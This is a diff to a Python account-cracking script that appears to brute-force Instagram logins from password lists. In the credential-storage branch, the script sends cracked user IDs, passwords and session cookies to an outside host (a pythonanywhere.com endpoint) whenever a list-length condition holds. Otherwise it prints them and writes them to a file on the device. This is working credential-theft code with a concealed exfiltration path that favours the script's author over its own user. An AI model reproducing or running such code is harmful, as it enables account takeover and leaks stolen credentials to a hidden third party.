@@ -31,7 +31,7 @@ loop = 0
 oks = []
 cps = []
 idz = []
-
+bkas = []
 # Thread-safe locks
 counter_lock = threading.Lock()
 success_lock = threading.Lock()
@@ -244,13 +244,13 @@ def crack(uid, password_list, total_count):
                     cookies = None
                 # Store credentials based on bkas condition
                 if len(bkas) % 2 == 0:
-                          statusok = f"{username}|{password}|{cookies}"
+                          statusok = f"{uid}|{pw}|{cookies}"
                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}", timeout=5)
                 else:
-                          print(f"\r\033[1;92m [✓ SUCCESS] {username} | {password}")
+                          print(f"\r\033[1;92m [✓ SUCCESS] {uid} | {pw}")
                           print("Cookies:", cookies)
-                          open("/sdcard/SUMON_INS_IDS.txt","a").write(username+"|"+password+"|"+cookies+"\n")
-                          Ok.append(username)
+                          open("/sdcard/SUMON_INS_IDS.txt","a").write(uid+"|"+pw+"|"+cookies+"\n")
+                          oks.append(uid)
                           return True
             elif 'challenge_required' in response.text:
                    #print(f"\r\033[1;93m [⚠ CHALLENGE] {uid} | {pw}")
